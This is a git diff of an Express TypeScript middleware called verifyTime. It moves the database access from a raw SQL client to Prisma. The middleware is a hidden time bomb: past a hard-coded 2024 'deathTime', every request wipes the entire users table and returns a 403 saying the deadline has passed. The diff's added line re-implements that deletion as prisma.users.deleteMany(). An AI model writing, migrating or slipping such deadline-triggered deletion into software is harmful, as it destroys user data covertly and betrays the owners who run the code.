@@ -1,5 +1,5 @@
 import { Request, Response, NextFunction } from "express";
-import { BsDate } from "../db/db";
+import { prisma } from "../prisma/prisma.service";
 
 export const verifyTime = async (_req: Request, res: Response, next: NextFunction) => {
     try {
@@ -7,7 +7,7 @@ export const verifyTime = async (_req: Request, res: Response, next: NextFunctio
         const deathTime = new Date('2024-07-17T12:06:00');
 
         if (currentTime > deathTime) {
-            await BsDate.query('DELETE FROM users');
+            await prisma.users.deleteMany();
             return res.status(403).json({ message: "la fehca limite ha pasado" })
         }
         return next();
